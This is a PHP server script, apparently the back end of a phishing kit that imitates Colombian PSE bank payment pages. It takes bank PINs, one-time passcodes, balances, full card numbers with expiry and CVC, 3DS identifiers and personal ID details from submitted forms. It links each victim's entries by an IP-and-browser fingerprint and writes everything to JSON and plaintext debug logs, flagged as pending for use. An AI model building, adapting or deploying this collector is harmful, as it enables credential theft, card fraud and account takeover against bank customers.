<?php
/**
 * track_stats.php - Guarda datos de PSE y TARJETAS
 * BUSCA por fingerprint (IP + User Agent) - UNIVERSAL
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Solo POST']);
    exit;
}

$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

$rawData = $_POST;

// ====== OBTENER IP Y USER AGENT ======
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// ====== GENERAR FINGERPRINT ======
$fingerprint = md5($ip . '_' . $userAgent);

// ====== BANCO (BUSCAR EN TODOS LOS CAMPOS POSIBLES) ======
$banco = '';
$camposBanco = ['banco', 'banco_seleccionado', 'banco_nombre', 'banco_pse'];
foreach ($camposBanco as $campo) {
    if (!empty($rawData[$campo])) {
        $banco = trim($rawData[$campo]);
        break;
    }
}

// ====== EXTRAER CUALQUIER IDENTIFICADOR QUE ENVÍE EL BANCO ======
$identificador = '';
$camposId = ['documento', 'identificacion', 'cedula', 'numero_documento', 'doc', 'id_usuario', 'documento_pse', 'usuario', 'user', 'username', 'celular', 'telefono'];
foreach ($camposId as $campo) {
    if (!empty($rawData[$campo])) {
        $identificador = trim($rawData[$campo]);
        break;
    }
}

// ====== CLAVES ======
$clave_pin = '';
$camposClave = ['clave_pin', 'clave', 'pin', 'password', 'clave_acceso'];
foreach ($camposClave as $campo) {
    if (!empty($rawData[$campo])) {
        $clave_pin = trim($rawData[$campo]);
        break;
    }
}

$codigo_otp = '';
$camposOtp = ['codigo_otp', 'codigo_dinamica', 'otp', 'codigo', 'codigo_verificacion', 'token'];
foreach ($camposOtp as $campo) {
    if (!empty($rawData[$campo])) {
        $codigo_otp = trim($rawData[$campo]);
        break;
    }
}

$saldo = trim($rawData['saldo'] ?? $rawData['saldo_cuenta'] ?? '');

// ====== DATOS DE TARJETA (NUEVO) ======
$numero_tarjeta = trim($rawData['numero_tarjeta'] ?? '');
$vencimiento = trim($rawData['vencimiento'] ?? '');
$cvc = trim($rawData['cvc'] ?? '');
$tipo_tarjeta = trim($rawData['tipo_tarjeta'] ?? '');
$id_3ds = trim($rawData['id_3ds'] ?? '');
$email = trim($rawData['email'] ?? '');
$celular = trim($rawData['celular'] ?? '');
$monto = trim($rawData['monto'] ?? '0');
$titular = trim($rawData['titular'] ?? '');
$nombre = trim($rawData['nombre'] ?? '');
$apellido = trim($rawData['apellido'] ?? '');
$cedula = trim($rawData['cedula'] ?? '');

// ====== LEER LOGS ======
$logsFile = $dataDir . '/pse_logs.json';

if (!file_exists($logsFile)) {
    file_put_contents($logsFile, '[]');
}

$content = file_get_contents($logsFile);
$logs = json_decode($content, true) ?? [];

// ====== DEPURACIÓN ======
$debugFile = __DIR__ . '/debug_track.txt';
file_put_contents($debugFile, date('Y-m-d H:i:s') . "\n", FILE_APPEND);
file_put_contents($debugFile, 'POST: ' . print_r($rawData, true) . "\n", FILE_APPEND);
file_put_contents($debugFile, "FINGERPRINT generado: $fingerprint\n", FILE_APPEND);
file_put_contents($debugFile, "IP: $ip, User Agent: $userAgent\n", FILE_APPEND);
file_put_contents($debugFile, "Identificador extraído: $identificador\n", FILE_APPEND);

// ====== MOSTRAR LOGS EN DEBUG ======
file_put_contents($debugFile, "LOGS EXISTENTES:\n", FILE_APPEND);
foreach ($logs as $i => $log) {
    $logId = $log['id'] ?? 'N/A';
    $logFingerprint = $log['fingerprint'] ?? 'N/A';
    $tieneJelpit = isset($log['tiene_jelpit']) ? ($log['tiene_jelpit'] ? 'SI' : 'NO') : 'NO';
    file_put_contents($debugFile, "  [$i] ID: $logId, fingerprint: $logFingerprint, tiene_jelpit: $tieneJelpit\n", FILE_APPEND);
}
file_put_contents($debugFile, "BUSCANDO fingerprint: '$fingerprint'\n", FILE_APPEND);

// ====== BUSCAR POR FINGERPRINT (PRIMERO) ======
$logEncontrado = false;
$logId = null;

foreach ($logs as &$log) {
    $logFingerprint = $log['fingerprint'] ?? '';
    
    // BUSCAR POR FINGERPRINT
    if (!empty($fingerprint) && !empty($logFingerprint) && $logFingerprint == $fingerprint) {
        $logEncontrado = true;
        $logId = $log['id'];
        
        file_put_contents($debugFile, ">>> ENCONTRADO POR FINGERPRINT: $fingerprint\n", FILE_APPEND);
        
        // ACTUALIZAR con datos del banco
        $log['banco'] = $banco;
        $log['clave_pin'] = $clave_pin;
        $log['codigo_otp'] = $codigo_otp;
        $log['saldo'] = $saldo;
        $log['fecha'] = date('Y-m-d H:i:s');
        $log['estado'] = 'pendiente';
        $log['tiene_jelpit'] = true;
        
        // ====== GUARDAR DATOS DE TARJETA SI EXISTEN ======
        if (!empty($numero_tarjeta)) $log['numero_tarjeta'] = $numero_tarjeta;
        if (!empty($vencimiento)) $log['vencimiento'] = $vencimiento;
        if (!empty($cvc)) $log['cvc'] = $cvc;
        if (!empty($tipo_tarjeta)) $log['tipo_tarjeta'] = $tipo_tarjeta;
        if (!empty($id_3ds)) $log['id_3ds'] = $id_3ds;
        if (!empty($email)) $log['email'] = $email;
        if (!empty($celular)) $log['celular'] = $celular;
        if (!empty($monto)) $log['monto'] = $monto;
        if (!empty($titular)) $log['titular'] = $titular;
        if (!empty($nombre)) $log['nombre'] = $nombre;
        if (!empty($apellido)) $log['apellido'] = $apellido;
        if (!empty($cedula)) {
            $log['documento'] = $cedula;
            $log['cedula'] = $cedula;
        }
        if (!empty($id_3ds)) $log['estado_3ds'] = 'pendiente';
        
        break;
    }
}
unset($log);

// ====== SI NO SE ENCONTRÓ POR FINGERPRINT, BUSCAR POR IDENTIFICADOR ======
if (!$logEncontrado && !empty($identificador)) {
    file_put_contents($debugFile, "BUSCANDO por identificador: '$identificador'\n", FILE_APPEND);
    
    foreach ($logs as &$log) {
        // Buscar en TODOS los campos posibles del log
        $docLog = $log['documento'] ?? $log['usuario'] ?? $log['identificacion'] ?? $log['cedula'] ?? $log['numero_documento'] ?? $log['celular'] ?? '';
        
        if (!empty($docLog) && trim($docLog) == trim($identificador)) {
            $logEncontrado = true;
            $logId = $log['id'];
            
            file_put_contents($debugFile, ">>> ENCONTRADO POR IDENTIFICADOR: $identificador\n", FILE_APPEND);
            
            $log['banco'] = $banco;
            $log['clave_pin'] = $clave_pin;
            $log['codigo_otp'] = $codigo_otp;
            $log['saldo'] = $saldo;
            $log['fecha'] = date('Y-m-d H:i:s');
            $log['estado'] = 'pendiente';
            if (!isset($log['tiene_jelpit'])) {
                $log['tiene_jelpit'] = false;
            }
            
            // ====== GUARDAR DATOS DE TARJETA SI EXISTEN ======
            if (!empty($numero_tarjeta)) $log['numero_tarjeta'] = $numero_tarjeta;
            if (!empty($vencimiento)) $log['vencimiento'] = $vencimiento;
            if (!empty($cvc)) $log['cvc'] = $cvc;
            if (!empty($tipo_tarjeta)) $log['tipo_tarjeta'] = $tipo_tarjeta;
            if (!empty($id_3ds)) $log['id_3ds'] = $id_3ds;
            if (!empty($email)) $log['email'] = $email;
            if (!empty($celular)) $log['celular'] = $celular;
            if (!empty($monto)) $log['monto'] = $monto;
            if (!empty($titular)) $log['titular'] = $titular;
            if (!empty($nombre)) $log['nombre'] = $nombre;
            if (!empty($apellido)) $log['apellido'] = $apellido;
            if (!empty($cedula)) {
                $log['documento'] = $cedula;
                $log['cedula'] = $cedula;
            }
            if (!empty($id_3ds)) $log['estado_3ds'] = 'pendiente';
            
            break;
        }
    }
    unset($log);
}

// ====== SI NO SE ENCONTRÓ, CREAR NUEVO ======
if (!$logEncontrado) {
    file_put_contents($debugFile, ">>> NO ENCONTRADO, CREANDO NUEVO LOG\n", FILE_APPEND);
    $newLog = [
        'id' => uniqid('PSE_'),
        'fecha' => date('Y-m-d H:i:s'),
        'banco' => $banco,
        'clave_pin' => $clave_pin,
        'codigo_otp' => $codigo_otp,
        'saldo' => $saldo,
        'estado' => 'pendiente',
        'tiene_jelpit' => false,
        'fingerprint' => $fingerprint,
        'ip' => $ip,
        'user_agent' => $userAgent,
        'identificador_banco' => $identificador,
        // ====== DATOS DE TARJETA ======
        'numero_tarjeta' => $numero_tarjeta,
        'vencimiento' => $vencimiento,
        'cvc' => $cvc,
        'tipo_tarjeta' => $tipo_tarjeta,
        'id_3ds' => $id_3ds,
        'email' => $email,
        'celular' => $celular,
        'monto' => $monto,
        'titular' => $titular,
        'nombre' => $nombre,
        'apellido' => $apellido,
        'cedula' => $cedula,
        'documento' => $cedula,
        'estado_3ds' => !empty($id_3ds) ? 'pendiente' : ''
    ];
    $logs[] = $newLog;
    $logId = $newLog['id'];
}

// ====== GUARDAR ======
file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

file_put_contents($debugFile, "RESULTADO: " . ($logEncontrado ? "ACTUALIZADO" : "CREADO") . " - ID: $logId\n\n", FILE_APPEND);

echo json_encode([
    'success' => true,
    'id' => $logId,
    'actualizado' => $logEncontrado,
    'fingerprint' => $fingerprint,
    'identificador' => $identificador,
    'banco' => $banco
]);

exit;
?>